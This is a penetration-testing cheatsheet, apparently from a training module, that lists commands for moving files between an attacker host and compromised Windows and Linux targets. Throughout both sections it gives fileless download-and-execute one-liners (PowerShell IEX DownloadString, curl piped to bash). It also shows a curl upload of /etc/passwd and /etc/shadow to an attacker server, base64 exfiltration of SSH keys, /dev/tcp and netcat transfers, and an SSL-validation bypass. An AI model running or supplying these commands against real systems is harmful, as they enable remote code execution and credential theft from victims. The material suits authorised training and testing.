---
title: Module 2 - File Transfers
tags: [file-transfer, windows, linux, cheatsheet]
---

# Module 2 - File Transfers
> Quick-reference cheatsheet for moving files between attack host and target.

---

## Summary

Covers every common method for moving files to/from Windows and Linux targets during an engagement. Methods are chosen based on what's available on the target, what ports are open, and whether you need to avoid touching disk.

| Category | Methods |
|----------|---------|
| **Windows Downloads** | PowerShell WebClient, IWR, SMB, FTP, Base64 decode |
| **Windows Uploads** | PSUpload, WebDAV/SMB, FTP, Base64 POST to netcat |
| **Linux Downloads** | wget, curl, SCP, /dev/tcp (no tools), Base64 decode |
| **Linux Uploads** | uploadserver (HTTPS), HTTP server + pull, SCP |
| **Code-based** | Python, PHP, Ruby, Perl, JS/VBS (cscript.exe) |
| **Misc** | Netcat, ncat, PowerShell Remoting (WinRM), RDP drive mount |
| **Protected** | OpenSSL AES-256 encrypt/decrypt, MD5 integrity checks |

**Key rule:** When standard tools are blocked, fall back to LOLBas (Windows) or GTFOBins (Linux). Always verify file integrity with MD5 after transfer.

---

## Windows — Downloads (to target)

```powershell
# Base64 decode (after encoding on Linux)
[IO.File]::WriteAllBytes("C:\Users\Public\file", [Convert]::FromBase64String("<b64string>"))

# PowerShell WebClient
(New-Object Net.WebClient).DownloadFile('<URL>', '<OutFile>')

# Invoke-WebRequest
Invoke-WebRequest <URL> -OutFile <file>

# Fileless — execute in memory
IEX (New-Object Net.WebClient).DownloadString('<URL>')

# SMB
copy \\<IP>\share\<file>
net use n: \\<IP>\share /user:test test && copy n:\<file>

# FTP
(New-Object Net.WebClient).DownloadFile('ftp://<IP>/<file>', '<OutFile>')
```

## Windows — Uploads (from target)

```powershell
# Base64 encode → paste to attack host
[Convert]::ToBase64String((Get-Content -Path "<file>" -Encoding byte))

# Upload to Python uploadserver
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<IP>:8000/upload -File <file>

# Base64 POST to netcat
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<file>' -Encoding Byte))
Invoke-WebRequest -Uri http://<IP>:8000/ -Method POST -Body $b64

# SMB/WebDAV
copy <file> \\<IP>\DavWWWRoot\

# FTP
(New-Object Net.WebClient).UploadFile('ftp://<IP>/<file>', '<LocalFile>')
```

---

## Linux — Downloads (to target)

```bash
# wget / curl
wget <URL> -O /tmp/<file>
curl -o /tmp/<file> <URL>

# Fileless
curl <URL> | bash
wget -qO- <URL> | python3

# /dev/tcp
exec 3<>/dev/tcp/<IP>/80
echo -e "GET /<file> HTTP/1.1\n\n">&3
cat <&3

# SCP
scp <user>@<IP>:/path/to/file .

# Base64 decode
echo -n '<b64string>' | base64 -d > <file>
```

## Linux — Uploads (from target)

```bash
# uploadserver
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
curl -X POST https://<IP>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure

# Simple HTTP server (serve files from target)
python3 -m http.server
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000

# SCP
scp <file> <user>@<IP>:/destination/
```

---

## Netcat

```bash
# Receive (on target)
nc -l -p 8000 > <file>

# Send (from attack host)
nc -q 0 <IP> 8000 < <file>

# Reverse — attack host listens, target connects
sudo nc -l -p 443 -q 0 < <file>    # attack host
nc <IP> 443 > <file>                 # target
```

---

## Protected Transfers

```bash
# Linux — encrypt
openssl enc -aes256 -iter 100000 -pbkdf2 -in <file> -out <file>.enc

# Linux — decrypt
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <file>.enc -out <file>
```

```powershell
# Windows — encrypt/decrypt (after importing Invoke-AESEncryption.ps1)
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\<file>
Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Path .\<file>.aes
```

---

## Integrity Check

```bash
# Linux
md5sum <file>

# Windows
Get-FileHash <file> -Algorithm MD5
```

---

## Resources

- [LOLBas](https://lolbas-project.github.io/) — Living off the land binaries (Windows)
- [GTFOBins](https://gtfobins.github.io/) — Unix binary abuse
- [Croc](https://github.com/schollz/croc) — Simple multiplatform file transfer tool

---

## All Commands

### Windows Downloads (to target)

```powershell
# Base64 decode (encode on Linux first)
[IO.File]::WriteAllBytes("C:\Users\Public\<file>", [Convert]::FromBase64String("<b64string>"))

# PowerShell WebClient — synchronous
(New-Object Net.WebClient).DownloadFile('<URL>', '<OutFile>')

# PowerShell WebClient — async
(New-Object Net.WebClient).DownloadFileAsync('<URL>', '<OutFile>')

# Fileless — execute in memory, no disk write
IEX (New-Object Net.WebClient).DownloadString('<URL>')
(New-Object Net.WebClient).DownloadString('<URL>') | IEX

# Invoke-WebRequest
Invoke-WebRequest <URL> -OutFile <file>

# Fix: IE first-launch config not completed
Invoke-WebRequest <URL> -UseBasicParsing | IEX

# Fix: untrusted SSL cert
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# SMB — copy directly
copy \\<IP>\share\<file>

# SMB — mount share first, then copy
net use n: \\<IP>\share /user:test test
copy n:\<file>

# FTP — single line
(New-Object Net.WebClient).DownloadFile('ftp://<IP>/<file>', 'C:\Users\Public\<file>')

# FTP — non-interactive (no full shell)
echo open <IP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET <file> >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

```bash
# Attack host — Linux encode for base64 transfer
md5sum id_rsa
cat id_rsa | base64 -w 0; echo

# Attack host — SMB server (no auth)
sudo impacket-smbserver share -smb2support /tmp/smbshare

# Attack host — SMB server (with auth)
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

# Attack host — FTP server
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

---

### Windows Uploads (from target)

```powershell
# Base64 encode file
[Convert]::ToBase64String((Get-Content -Path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

# PSUpload — upload to uploadserver
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<IP>:8000/upload -File C:\Windows\System32\drivers\etc\hosts

# Base64 POST body (receive with netcat)
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://<IP>:8000/ -Method POST -Body $b64

# WebDAV — browse and upload
dir \\<IP>\DavWWWRoot
copy C:\Users\john\Desktop\file.zip \\<IP>\DavWWWRoot\
copy C:\Users\john\Desktop\file.zip \\<IP>\sharefolder\

# FTP upload — single line
(New-Object Net.WebClient).UploadFile('ftp://<IP>/hosts', 'C:\Windows\System32\drivers\etc\hosts')

# FTP upload — non-interactive
echo open <IP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT C:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

# WinRM — push/pull between Windows machines
Test-NetConnection -ComputerName DATABASE01 -Port 5985
$Session = New-PSSession -ComputerName DATABASE01
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

```bash
# Attack host — start upload server
pip3 install uploadserver
python3 -m uploadserver

# Attack host — receive base64 POST via netcat
nc -lvnp 8000
echo <b64> | base64 -d -w 0 > hosts

# Attack host — start WebDAV server
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

# Attack host — FTP server with write access
sudo python3 -m pyftpdlib --port 21 --write

# Attack host — decode base64
echo <b64string> | base64 -d > hosts
md5sum hosts
```

---

### Linux Downloads (to target)

```bash
# wget / curl
wget <URL> -O /tmp/<file>
curl -o /tmp/<file> <URL>

# Fileless — execute without writing to disk
curl <URL> | bash
wget -qO- <URL> | python3

# /dev/tcp — no tools needed
exec 3<>/dev/tcp/<IP>/80
echo -e "GET /<file> HTTP/1.1\n\n">&3
cat <&3

# SCP
sudo systemctl enable ssh && sudo systemctl start ssh
scp <user>@<IP>:/path/to/file .

# Base64 decode
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
echo -n '<b64string>' | base64 -d > id_rsa
md5sum id_rsa
```

### Linux Uploads (from target)

```bash
# uploadserver — HTTPS with self-signed cert
sudo python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# Upload from target
curl -X POST https://<IP>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure

# Serve files from target (pull from attack host)
python3 -m http.server
python2.7 -m SimpleHTTPServer
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
wget <targetIP>:8000/<file>           # pull from attack host

# SCP upload
scp <localfile> <user>@<IP>:/destination/
```

---

### Code-based Transfers

```bash
# Python 3
python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<OutFile>")'

# Python 2.7
python2.7 -c 'import urllib;urllib.urlretrieve("<URL>", "<OutFile>")'

# PHP — file_get_contents
php -r '$file = file_get_contents("<URL>"); file_put_contents("<OutFile>",$file);'

# PHP — fileless, pipe to bash
php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash

# Ruby
ruby -e 'require "net/http"; File.write("<OutFile>", Net::HTTP.get(URI.parse("<URL>")))'

# Perl
perl -e 'use LWP::Simple; getstore("<URL>", "<OutFile>");'
```

```powershell
# JavaScript via cscript.exe (create wget.js first)
cscript.exe /nologo wget.js <URL> <OutFile>

# VBScript via cscript.exe (create wget.vbs first)
cscript.exe /nologo wget.vbs <URL> <OutFile>
```

---

### Netcat / Ncat

```bash
# Target receives, attack host sends
nc -l -p 8000 > <file>                       # target — listen
ncat -l -p 8000 --recv-only > <file>         # target — listen (ncat)
nc -q 0 <targetIP> 8000 < <file>             # attack host — send
ncat --send-only <targetIP> 8000 < <file>    # attack host — send (ncat)

# Attack host listens, target connects (when inbound blocked)
sudo nc -l -p 443 -q 0 < <file>             # attack host — serve
sudo ncat -l -p 443 --send-only < <file>    # attack host — serve (ncat)
nc <attackIP> 443 > <file>                   # target — receive
ncat <attackIP> 443 --recv-only > <file>    # target — receive (ncat)
```

---

### RDP

```bash
# Mount local folder into RDP session
rdesktop <IP> -d <DOMAIN> -u <user> -p '<password>' -r disk:linux='/home/user/files'
xfreerdp /v:<IP> /d:<DOMAIN> /u:<user> /p:'<password>' /drive:linux,/home/user/filetransfer
```

---

### Protected Transfers & Integrity

```bash
# Encrypt
openssl enc -aes256 -iter 100000 -pbkdf2 -in <file> -out <file>.enc

# Decrypt
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <file>.enc -out <file>

# Integrity — Linux
md5sum <file>
```

```powershell
# Encrypt/decrypt (after importing Invoke-AESEncryption.ps1)
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\<file>
Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Path .\<file>.aes

# Integrity — Windows
Get-FileHash <file> -Algorithm MD5
```
